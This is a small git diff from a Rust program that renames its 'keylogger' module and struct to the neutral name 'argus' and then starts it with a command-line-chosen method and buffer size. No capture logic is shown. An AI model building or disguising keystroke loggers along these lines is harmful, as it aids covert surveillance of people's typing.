@@ -1,7 +1,7 @@
 mod cli_parser;
-mod keylogger;
+mod argus;
 mod method;
-use keylogger::Keylogger;
+use argus::Argus;
 
 use std::process::exit;
 
@@ -9,9 +9,9 @@ const BUFFER_CAPACITY: usize = 100;
 
 fn wrapper() -> Result<(), String> {
     let method = cli_parser::get_method()?;
-    let mut keylogger = Keylogger::new(method)
+    let mut argus = Argus::new(method)
         .set_buffer_capacity(BUFFER_CAPACITY);
-    keylogger.start();
+    argus.start();
     Ok(())
 }
 
